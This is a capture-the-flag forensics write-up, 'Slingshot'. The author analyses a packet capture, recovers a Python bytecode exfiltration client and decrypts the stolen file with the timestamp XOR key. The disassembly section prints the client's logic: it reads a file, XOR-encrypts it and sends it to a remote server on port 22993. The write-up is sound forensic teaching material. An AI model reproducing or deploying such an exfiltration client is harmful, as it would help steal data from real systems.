## Name: Slingshot
#### Category: Forensics
#### Difficulty: Medium
#### Description: We have recently suffered a data breach, and we need help figuring out if any data was stolen. Can you investigate this pcap file and see if there is any evidence of data exfiltration and if possible, what was stolen.

## Procedure
I started filtering the http request from the pcapng file using tshark with the following command ```tshark -r Slingshot.pcapng -Y "http" ```, the output shows us an interesting pyc file.

```
  153  17.422050 10.151.198.69 → 192.229.211.108 OCSP 495 Request
  155  17.428127 192.229.211.108 → 10.151.198.69 OCSP 791 Response
11869  30.208327 10.151.198.69 → 142.251.163.94 OCSP 492 Request
11878  30.229229 142.251.163.94 → 10.151.198.69 OCSP 756 Response
11956  30.257744 10.151.198.69 → 142.251.163.94 OCSP 492 Request
12195  30.279945 142.251.163.94 → 10.151.198.69 OCSP 756 Response
12888  37.343816 10.151.198.69 → 93.132.55.192 HTTP 557 GET / HTTP/1.1 
12957  37.491498 93.132.55.192 → 10.151.198.69 HTTP 277 HTTP/1.1 200 OK  (text/html)
12960  37.545813 10.151.198.69 → 93.132.55.192 HTTP 425 GET /favicon.ico HTTP/1.1 
12970  38.920901 10.151.198.69 → 93.132.55.192 HTTP 499 GET /download.pyc HTTP/1.1 
12973  38.984509 93.132.55.192 → 10.151.198.69 HTTP 723 HTTP/1.1 200 OK 
```

Export the file with wireshark ```File > Export Objects > HTTP``` or u can export the objects with tshark, but u need to know the http stream id with the command ```tshark -r Slingshot.pcapng -Y 'http.request.uri=="/download.pyc"' -T fields -e tcp.stream```, then export HTTP object with command ``` tshark -r Slingshot.pcapng -Y 'tcp.stream==29' --export-object "http,./data"```

Objects extrated in data folder

```
data/
├── %2f
├── %2f(1)
├── %2f(2)
├── download.pyc
├── wr2
├── wr2(1)
├── wr2(2)
└── wr2(3)
```

The ```.pyc``` files are compiled Python bytecode files. They are created automatically by Python when a .py file is executed, and they contain the compiled version of the Python code. .pyc files are platform-independent and can be executed by the Python interpreter, but they cannot be easily read in their raw format because they contain bytecode, not human-readable Python code

U can try to recover the python code using tools like [pycdc](https://github.com/zrax/pycdc), running ```./pycdc download.pyc``` shows us the following data

### Download.pyc content
1) The script imports several standard modules, including sys for command-line arguments, socket for network communication, time for time-based operations, and math for mathematical functions (though math is not yet used).
2) A TCP socket (AF_INET for IPv4, SOCK_STREAM for TCP) is created. This socket will be used to establish a connection with a remote server.
3) The script expects two command-line arguments: ```sys.argv[1]``` is expected to be a file name. ```sys.argv[2]``` is expected to be the IP address of the remote server.
4) The script is hardcoded to use port 22993.

```
# Source Generated with Decompyle++
# File: download.pyc (Python 3.11)

Unsupported opcode: BEFORE_WITH
import sys
import socket
import time
import math
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
file = sys.argv[1]
ip = sys.argv[2]
port = 22993
# WARNING: Decompyle incomplete
```

The code recovered is not complete, running the command ```./pycdas download.pyc``` we can see the following output
```
[Code]
    File Name: client.py
    Object Name: <module>
    Qualified Name: <module>
    Arg Count: 0
    Pos Only Arg Count: 0
    KW Only Arg Count: 0
    Stack Size: 7
    Flags: 0x00000000
    [Names]
        'sys'
        'socket'
        'time'
        'math'
        'AF_INET'
        'SOCK_STREAM'
        's'
        'argv'
        'file'
        'ip'
        'port'
        'open'
        'r'
        'read'
        'data_bytes'
        'current_time'
        'floor'
        'str'
        'encode'
        'key_bytes'
        'len'
        'init_key_len'
        'data_bytes_len'
        'temp1'
        'temp2'
        'bytes'
        'zip'
        'encrypt_bytes'
        'connect'
        'send'
    [Locals+Names]
    [Constants]
        0
        None
        1
        2
        22993
        'rb'
        'utf-8'
        [Code]
            File Name: client.py
            Object Name: <genexpr>
            Qualified Name: <genexpr>
            Arg Count: 1
            Pos Only Arg Count: 0
            KW Only Arg Count: 0
            Stack Size: 3
            Flags: 0x00000023 (CO_OPTIMIZED | CO_NEWLOCALS | CO_GENERATOR)
            [Names]
            [Locals+Names]
                '.0'
                'a'
                'b'
            [Constants]
                None
            [Disassembly]
                0       RETURN_GENERATOR                
                2       POP_TOP                         
                4       RESUME                          0
                6       LOAD_FAST                       0: .0
                8       FOR_ITER                        12 (to 34)
                10      UNPACK_SEQUENCE                 2
                14      STORE_FAST                      1: a
                16      STORE_FAST                      2: b
                18      LOAD_FAST                       1: a
                20      LOAD_FAST                       2: b
                22      BINARY_OP                       12 (^)
                26      YIELD_VALUE                     
                28      RESUME                          1
                30      POP_TOP                         
                32      JUMP_BACKWARD                   13 (to 8)
                34      LOAD_CONST                      0: None
                36      RETURN_VALUE                    
    [Disassembly]
        0       RESUME                          0
        2       LOAD_CONST                      0: 0
        4       LOAD_CONST                      1: None
        6       IMPORT_NAME                     0: sys
        8       STORE_NAME                      0: sys
        10      LOAD_CONST                      0: 0
        12      LOAD_CONST                      1: None
        14      IMPORT_NAME                     1: socket
        16      STORE_NAME                      1: socket
        18      LOAD_CONST                      0: 0
        20      LOAD_CONST                      1: None
        22      IMPORT_NAME                     2: time
        24      STORE_NAME                      2: time
        26      LOAD_CONST                      0: 0
        28      LOAD_CONST                      1: None
        30      IMPORT_NAME                     3: math
        32      STORE_NAME                      3: math
        34      PUSH_NULL                       
        36      LOAD_NAME                       1: socket
        38      LOAD_ATTR                       1: socket
        48      LOAD_NAME                       1: socket
        50      LOAD_ATTR                       4: AF_INET
        60      LOAD_NAME                       1: socket
        62      LOAD_ATTR                       5: SOCK_STREAM
        72      PRECALL                         2
        76      CALL                            2
        86      STORE_NAME                      6: s
        88      LOAD_NAME                       0: sys
        90      LOAD_ATTR                       7: argv
        100     LOAD_CONST                      2: 1
        102     BINARY_SUBSCR                   
        112     STORE_NAME                      8: file
        114     LOAD_NAME                       0: sys
        116     LOAD_ATTR                       7: argv
        126     LOAD_CONST                      3: 2
        128     BINARY_SUBSCR                   
        138     STORE_NAME                      9: ip
        140     LOAD_CONST                      4: 22993
        142     STORE_NAME                      10: port
        144     PUSH_NULL                       
        146     LOAD_NAME                       11: open
        148     LOAD_NAME                       8: file
        150     LOAD_CONST                      5: 'rb'
        152     PRECALL                         2
        156     CALL                            2
        166     BEFORE_WITH                     
        168     STORE_NAME                      12: r
        170     LOAD_NAME                       12: r
        172     LOAD_METHOD                     13: read
        194     PRECALL                         0
        198     CALL                            0
        208     STORE_NAME                      14: data_bytes
        210     LOAD_CONST                      1: None
        212     LOAD_CONST                      1: None
        214     LOAD_CONST                      1: None
        216     PRECALL                         2
        220     CALL                            2
        230     POP_TOP                         
        232     JUMP_FORWARD                    11 (to 256)
        234     PUSH_EXC_INFO                   
        236     WITH_EXCEPT_START               
        238     POP_JUMP_FORWARD_IF_TRUE        4 (to 248)
        240     RERAISE                         2
        242     COPY                            3
        244     POP_EXCEPT                      
        246     RERAISE                         1
        248     POP_TOP                         
        250     POP_EXCEPT                      
        252     POP_TOP                         
        254     POP_TOP                         
        256     PUSH_NULL                       
        258     LOAD_NAME                       2: time
        260     LOAD_ATTR                       2: time
        270     PRECALL                         0
        274     CALL                            0
        284     STORE_NAME                      15: current_time
        286     PUSH_NULL                       
        288     LOAD_NAME                       3: math
        290     LOAD_ATTR                       16: floor
        300     LOAD_NAME                       15: current_time
        302     PRECALL                         1
        306     CALL                            1
        316     STORE_NAME                      15: current_time
        318     PUSH_NULL                       
        320     LOAD_NAME                       17: str
        322     LOAD_NAME                       15: current_time
        324     PRECALL                         1
        328     CALL                            1
        338     LOAD_METHOD                     18: encode
        360     LOAD_CONST                      6: 'utf-8'
        362     PRECALL                         1
        366     CALL                            1
        376     STORE_NAME                      19: key_bytes
        378     PUSH_NULL                       
        380     LOAD_NAME                       20: len
        382     LOAD_NAME                       19: key_bytes
        384     PRECALL                         1
        388     CALL                            1
        398     STORE_NAME                      21: init_key_len
        400     PUSH_NULL                       
        402     LOAD_NAME                       20: len
        404     LOAD_NAME                       14: data_bytes
        406     PRECALL                         1
        410     CALL                            1
        420     STORE_NAME                      22: data_bytes_len
        422     LOAD_NAME                       22: data_bytes_len
        424     LOAD_NAME                       21: init_key_len
        426     BINARY_OP                       2 (//)
        430     STORE_NAME                      23: temp1
        432     LOAD_NAME                       22: data_bytes_len
        434     LOAD_NAME                       21: init_key_len
        436     BINARY_OP                       6 (%)
        440     STORE_NAME                      24: temp2
        442     LOAD_NAME                       19: key_bytes
        444     LOAD_NAME                       23: temp1
        446     BINARY_OP                       18 (*=)
        450     STORE_NAME                      19: key_bytes
        452     LOAD_NAME                       19: key_bytes
        454     LOAD_NAME                       19: key_bytes
        456     LOAD_CONST                      1: None
        458     LOAD_NAME                       24: temp2
        460     BUILD_SLICE                     2
        462     BINARY_SUBSCR                   
        472     BINARY_OP                       13 (+=)
        476     STORE_NAME                      19: key_bytes
        478     PUSH_NULL                       
        480     LOAD_NAME                       25: bytes
        482     LOAD_CONST                      7: <CODE> <genexpr>
        484     MAKE_FUNCTION                   0
        486     PUSH_NULL                       
        488     LOAD_NAME                       26: zip
        490     LOAD_NAME                       19: key_bytes
        492     LOAD_NAME                       14: data_bytes
        494     PRECALL                         2
        498     CALL                            2
        508     GET_ITER                        
        510     PRECALL                         0
        514     CALL                            0
        524     PRECALL                         1
        528     CALL                            1
        538     STORE_NAME                      27: encrypt_bytes
        540     LOAD_NAME                       6: s
        542     LOAD_METHOD                     28: connect
        564     LOAD_NAME                       9: ip
        566     LOAD_NAME                       10: port
        568     BUILD_TUPLE                     2
        570     PRECALL                         1
        574     CALL                            1
        584     POP_TOP                         
        586     LOAD_NAME                       6: s
        588     LOAD_METHOD                     29: send
        610     LOAD_NAME                       27: encrypt_bytes
        612     PRECALL                         1
        616     CALL                            1
        626     POP_TOP                         
        628     LOAD_CONST                      1: None
        630     RETURN_VALUE
```
### Important data
1) The current time (time.time()) is used as the basis for an encryption key, converted into a string, and then encoded as UTF-8.
2) The length of the key is adjusted by repeating and slicing it to match the length of the file's contents.
3) The file's data is XORed with the key to produce the encrypted data (encrypt_bytes).
4) The encrypted data is sent to the server at the specified IP address and port (22993).

Now we know that our flag was sent into the tcp port ```22993```, and was encrypted with XOR using the timestamp to create the encryption key.

We have to extract the data sent into the tcp port ```22993```, and check for the packet with the ```SYN```  flag set, because the timestamp in first ```SYN``` packet will give us the key used to encrypt our flag

![2024-09-24_15-18](https://github.com/user-attachments/assets/4aec1595-c378-4a8e-b58a-acb01381b237)

Our XOR key is ```1726595769```, a very important step here is extract the timestamp in ```Relative Time```, this option will display the time to the beginning of the capture. Using tshark with options ```-t e``` running the following command ```tshark -r Slingshot.pcapng -Y "tcp.port==22993" -t e```

Now, we need to extract the encrypted data, we got the stream id with the command ```tshark -r Slingshot.pcapng -Y "tcp.port==22993" -t e -T fields -e 'tcp.stream'``` the stream id is ```30```, and now extract the hex data with the command ```tshark -r Slingshot.pcapng -Y 'tcp.stream==30' -T fields -e data > slingshot_data.txt``` this will save the hex data into ```slingshot_data.txt``` file.

I have written the following script to decrypt out flag.
```
from pwn import xor

key="1726595769"

data = open("slingshot_data.txt","r").read().replace("\n","")

flag= xor(bytes.fromhex(data),key)

with open("flag.png", "wb") as flag_file:
   flag_file.write(flag)
```
![2024-09-24_15-58](https://github.com/user-attachments/assets/d3428d97-33ca-43c4-827f-6be2147ed23a)




